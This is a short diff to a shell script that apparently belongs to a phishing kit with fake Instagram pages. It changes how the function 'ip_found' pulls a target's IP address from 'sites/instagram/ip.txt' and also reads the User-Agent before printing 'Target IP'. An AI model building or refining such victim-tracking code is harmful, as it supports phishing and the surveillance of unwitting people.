@@ -550,7 +550,7 @@ echo ""
 
 ip_found() {
 
-  ip=$(sed -n ''4','4'p' iptracker.log | cut -d ">" -f2 |  cut -d "-" -f1)
+  ip=$(grep -a 'IP:' sites/instagram/ip.txt | cut -d " " -f2 | tr -d '\r')
   IFS=$'\n'
   ua=$(grep 'User-Agent:' sites/instagram/ip.txt | cut -d '"' -f2)
   echo -e "$green ------> Target IP:$red $ip $farblos"
